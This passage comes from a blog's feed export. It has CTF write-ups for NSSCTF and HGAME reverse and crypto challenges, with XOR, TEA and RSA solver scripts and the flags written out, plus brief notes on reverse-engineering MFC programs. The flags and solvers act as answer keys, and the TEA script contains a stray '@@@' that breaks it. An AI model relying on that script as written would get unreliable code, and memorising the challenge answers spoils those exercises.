class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>((result[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]),<span class="number">16</span>)^key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br><span class="line"><span class="comment"># flag = NSSCTF&#123;EZEZ_RERE&#125;</span></span><br></pre></td></tr></table></figure><h3 id="SWPUCTF-2021-新生赛-re1"><a href="#SWPUCTF-2021-新生赛-re1" class="headerlink" title="[SWPUCTF 2021 新生赛]re1"></a>[SWPUCTF 2021 新生赛]re1</h3><p>就是，变一下，3–e  4–a</p><p>NSSCTF{easy_reverse}</p><h3 id="HGAME-2023-week1-a-cup-of-tea"><a href="#HGAME-2023-week1-a-cup-of-tea" class="headerlink" title="[HGAME 2023 week1]a_cup_of_tea"></a>[HGAME 2023 week1]a_cup_of_tea</h3><p>45678901345678902345678912345678</p><p>放个TEA小轮子：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span> @@@</span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = [<span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>, <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span>, <span class="number">0x7D6B</span>]</span><br><span class="line">    cc = [long_to_bytes(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x23456789</span>, <span class="number">0x34567890</span>, <span class="number">0x45678901</span>]</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">        d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">        flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>]+long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(c[-<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="小轮子RSA"><a href="#小轮子RSA" class="headerlink" title="小轮子RSA"></a>小轮子RSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;factordb.com_is_strong!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF&quot;&gt;&lt;a href=&quot;#NSSCTF&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF&quot;&gt;&lt;/a&gt;NSSCTF&lt;/h1&gt;&lt;h3 id=&quot;SWPUCTF-2021-新生赛-简简单单的逻辑&quot;&gt;&lt;a href=&quot;#SWPUCTF-2021-</summary>
      
    
    
    
    
    <category term="NSSCTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/NSSCTF/"/>
    
  </entry>
  
  <entry>
    <title>MFC图形化界面</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/04/13/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/04/13/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/</id>
    <published>2024-04-12T16:00:00.000Z</published>
    <updated>2024-10-30T11:44:31.919Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MFC图形化界面"><a href="#MFC图形化界面" class="headerlink" title="MFC图形化界面"></a>MFC图形化界面</h1><h2 id="windows桌面应用编程"><a href="#windows桌面应用编程" class="headerlink" title="windows桌面应用编程"></a>windows桌面应用编程</h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202804698.png" alt="image-20240203202804698"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202813056.png" alt="image-20240203202813056"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202823482.png" alt="image-20240203202823482"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202851227.png" alt="image-20240203202851227"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202903575.png" alt="image-20240203202903575"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202911473.png" alt="image-20240203202911473"></p><h2 id="MFC-正向开发"><a href="#MFC-正向开发" class="headerlink" title="MFC 正向开发"></a><strong>MFC</strong> <strong>正向开发</strong></h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202925910.png" alt="image-20240203202925910"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202934106.png" alt="image-20240203202934106"></p><h2 id="逆向思路"><a href="#逆向思路" class="headerlink" title="逆向思路"></a><strong>逆向思路</strong></h2><ul><li><p>通过 ResourceHacker 可以获取控件的 ID 号、修改控件布局等</p></li><li><p>通过 xspy 可以获取控件消息所对应的处理函数地址</p></li><li><p>通过 GetDlgItem &#x2F; GetDlgItemText &#x2F; GetDlgItemInt &#x2F; GetWindowText 系列 API 找到关键函数</p></li></ul><p>找到关键函数后，即为常规逆向</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MFC图形化界面&quot;&gt;&lt;a href=&quot;#MFC图形化界面&quot; class=&quot;headerlink&quot; title=&quot;MFC图形化界面&quot;&gt;&lt;/a&gt;MFC图形化界面&lt;/h1&gt;&lt;h2 id=&quot;windows桌面应用编程&quot;&gt;&lt;a href=&quot;#windows桌面应用编程&quot; c</summary>
      
    
    
    
    
    <category term="MFC" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/MFC/"/>
    
  </entry>
  
</feed>
